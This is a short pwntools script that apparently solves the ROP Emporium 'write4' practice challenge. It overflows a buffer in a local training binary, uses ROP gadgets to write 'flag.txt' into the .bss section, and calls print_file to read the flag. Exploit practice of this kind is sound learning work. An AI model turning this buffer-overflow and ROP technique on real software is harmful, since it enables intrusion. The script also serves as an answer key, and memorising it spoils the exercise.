from pwn import *

elf = ELF("./attachment/write4")
rop = ROP(elf)

io = process(elf.path, cwd="./attachment", level="DEBUG")
bss_address = 0x00601038

io.recv()
payload = b"A" * 40
payload += p64(0x0000000000400690)  # pop r14; pop r15; ret
payload += p64(bss_address)
payload += b"flag.txt"
payload += p64(0x0000000000400628)  # mov qword ptr [r14], r15 ; ret
payload += p64(0x0000000000400693)  # pop rdi; ret
payload += p64(bss_address)
payload += p64(rop.ret.address)
payload += p64(0x0000000000400510)  # print_file@plt
io.sendline(payload)
io.recvall()